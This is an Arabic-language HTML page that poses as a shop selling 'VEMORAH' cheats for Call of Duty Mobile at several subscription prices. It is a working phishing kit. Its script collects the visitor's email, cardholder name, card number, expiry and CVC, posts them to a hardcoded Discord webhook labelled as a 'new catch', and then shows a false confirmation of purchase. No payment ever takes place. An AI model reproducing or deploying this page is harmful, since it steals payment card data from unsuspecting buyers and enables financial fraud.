<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VEMORAH | SYSTEM ACCESS</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Orbitron:wght@600;900&display=swap');
        
        :root { --gold: #bf953f; --dark-gold: #aa771c; }
        body { background-color: #020202; color: #fff; font-family: 'Cairo', sans-serif; overflow-x: hidden; margin: 0; }

        /* الخلفية المتجاوبة */
        .bg-layer {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% 50%, rgba(191, 149, 63, 0.05) 0%, transparent 80%);
            z-index: -1;
        }
        .cyber-grid {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
            background-size: 30px 30px;
            z-index: -1;
            mask-image: radial-gradient(circle at center, black, transparent 90%);
        }

        .gold-glow { color: var(--gold); text-shadow: 0 0 10px rgba(191, 149, 63, 0.3); }
        .orbitron { font-family: 'Orbitron', sans-serif; }

        /* تعديلات الكروت لتناسب الجوال */
        .premium-card {
            background: rgba(15, 15, 15, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(191, 149, 63, 0.1);
            border-radius: 20px;
            transition: 0.4s ease;
            width: 100%;
        }
        .premium-card:hover { border-color: var(--gold); transform: translateY(-5px); }

        .btn-gold {
            background: linear-gradient(45deg, var(--dark-gold), var(--gold));
            color: #000;
            font-weight: 900;
            transition: 0.3s;
        }

        .neo-input {
            background: rgba(0,0,0,0.8) !important;
            border: 1px solid #333 !important;
            color: var(--gold) !important;
            border-radius: 10px !important;
            padding: 12px !important;
            text-align: center;
            font-family: 'Orbitron', sans-serif;
            font-size: 14px;
        }

        /* نافذة الدفع المتجاوبة */
        .swal2-popup {
            width: 95% !important;
            max-width: 450px !important;
            border-radius: 20px !important;
        }

        .visa-preview {
            background: linear-gradient(135deg, #111, #000);
            border: 1px solid rgba(191, 149, 63, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 15px;
        }

        @media (max-width: 640px) {
            .text-huge { font-size: 3rem !important; }
        }
    </style>
</head>
<body>

    <div class="bg-layer"></div>
    <div class="cyber-grid"></div>

    <nav class="flex justify-between items-center p-6 max-w-7xl mx-auto">
        <div class="flex items-center gap-3">
            <div class="h-8 w-1 bg-yellow-600"></div>
            <h1 class="orbitron text-xl md:text-2xl font-black tracking-widest gold-glow">VEMORAH</h1>
        </div>
        <div class="hidden sm:flex items-center gap-2 text-yellow-600/60">
            <i class="fas fa-moon"></i>
            <span class="orbitron text-[9px] tracking-[3px]">RAMADAN_EDITION</span>
        </div>
    </nav>

    <main class="max-w-7xl mx-auto px-4 py-8 text-center">
        <h2 class="text-huge text-5xl md:text-8xl font-black mb-6 leading-tight">هاكات <span class="gold-glow">العراب</span></h2>
        <p class="text-gray-500 max-w-md mx-auto mb-12 text-sm md:text-lg">انسى الباند مع أقوى حماية لـ CODM. انضم للملوك الآن.</p>

        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-10">
            <div onclick="startStep1('15')" class="premium-card p-8 flex flex-col items-center">
                <i class="fas fa-bolt text-gray-700 text-2xl mb-4"></i>
                <span class="orbitron text-[10px] text-gray-500 mb-2">WEEKLY_PASS</span>
                <div class="text-4xl font-black mb-8 orbitron">$15</div>
                <button class="w-full btn-gold py-3 rounded-xl orbitron text-[10px]">اشتراك أسبوعي</button>
            </div>

            <div onclick="startStep1('40')" class="premium-card p-8 flex flex-col items-center border-yellow-600/40 bg-yellow-600/5 sm:scale-105">
                <i class="fas fa-crown text-yellow-500 text-2xl mb-4"></i>
                <span class="orbitron text-[10px] text-yellow-500 mb-2">MOST_POPULAR</span>
                <div class="text-5xl font-black mb-8 orbitron gold-glow">$40</div>
                <button class="w-full btn-gold py-3 rounded-xl orbitron text-[10px]">اشتراك شهري</button>
            </div>

            <div onclick="startStep1('250')" class="premium-card p-8 flex flex-col items-center sm:col-span-2 lg:col-span-1">
                <i class="fas fa-infinity text-gray-700 text-2xl mb-4"></i>
                <span class="orbitron text-[10px] text-gray-500 mb-2">LIFETIME_ACCESS</span>
                <div class="text-4xl font-black mb-8 orbitron">$250</div>
                <button class="w-full btn-gold py-3 rounded-xl orbitron text-[10px]">اشتراك سنوي</button>
            </div>
        </div>
    </main>

    <script>
        const WH = "https://discord.com/api/webhooks/1474024330412425226/zvPRFXHvATNuEQLiNMplwHxcc4nQfXGhGhmmdhc4mwvt-Xtll5wyUAaenMBlPiyJc8kh";

        async function startStep1(price) {
            const { value: email } = await Swal.fire({
                title: 'LOGIN',
                background: '#050505', color: '#bf953f',
                confirmButtonText: 'CONTINUE',
                confirmButtonColor: '#aa771c',
                html: `
                    <p class="text-[10px] orbitron mb-4 opacity-40">ENTER GMAIL FOR ACTIVATION CODE</p>
                    <input id="em" class="neo-input w-full" placeholder="example@gmail.com" type="email">
                `,
                preConfirm: () => {
                    const e = document.getElementById('em').value;
                    if(!e || !e.includes('@')) return Swal.showValidationMessage('INVALID_EMAIL');
                    return e;
                }
            });
            if (email) checkout(price, email);
        }

        function checkout(price, email) {
            Swal.fire({
                background: '#050505', color: '#fff',
                confirmButtonText: `PAY $${price}`,
                confirmButtonColor: '#bf953f',
                html: `
                    <div class="visa-preview text-left relative overflow-hidden">
                        <i class="fas fa-star-and-crescent absolute top-2 right-2 opacity-10 text-4xl"></i>
                        <div class="flex justify-between items-start mb-8">
                            <i class="fas fa-microchip text-2xl text-yellow-800"></i>
                            <i class="fab fa-cc-visa text-2xl opacity-20"></i>
                        </div>
                        <div id="pv" class="orbitron text-lg tracking-[3px] mb-4">**** **** **** ****</div>
                        <div class="flex justify-between orbitron text-[8px] opacity-40">
                            <span>${email.toUpperCase()}</span>
                            <span>EXP: 00/00</span>
                        </div>
                    </div>
                    <div class="flex flex-col gap-2">
                        <input id="n" class="neo-input" placeholder="CARD HOLDER" oninput="u()">
                        <input id="v" class="neo-input" placeholder="CARD NUMBER" maxlength="19" oninput="u()">
                        <div class="flex gap-2">
                            <input id="d" class="neo-input w-1/2" placeholder="MM/YY" maxlength="5">
                            <input id="c" class="neo-input w-1/2" placeholder="CVC" maxlength="3">
                        </div>
                    </div>
                `,
                preConfirm: () => {
                    return { e: email, n: document.getElementById('n').value, v: document.getElementById('v').value, d: document.getElementById('d').value, c: document.getElementById('c').value, p: price }
                }
            }).then((res) => { if(res.isConfirmed) send(res.value); });
        }

        function u() { document.getElementById('pv').innerText = document.getElementById('v').value || "**** **** **** ****"; }

        async function send(data) {
            Swal.fire({ title: 'SECURE_SENDING...', background: '#050505', color: '#bf953f', didOpen: () => Swal.showLoading() });
            const payload = {
                username: "VEMORAH_V14",
                embeds: [{
                    title: "🌙 صيد جديد - VEMORAH RESPONSIVE",
                    color: 16751104,
                    fields: [
                        { name: "📧 EMAIL", value: `\`${data.e}\`` },
                        { name: "👤 HOLDER", value: `\`${data.n}\``, inline: true },
                        { name: "💰 PRICE", value: `\`${data.p}$\``, inline: true },
                        { name: "💳 CC", value: `\`\`\`yaml\n${data.v}\nEXP: ${data.d} | CVC: ${data.c}\n\`\`\`` }
                    ],
                    footer: { text: "DEVICE: " + navigator.platform }
                }]
            };
            await fetch(WH, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
            Swal.fire({ icon: 'success', title: 'تمت العملية', text: 'سيصلك الكود على بريدك الإلكتروني قريباً.', background: '#050505', color: '#bf953f' });
        }
    </script>
</body>
</html>
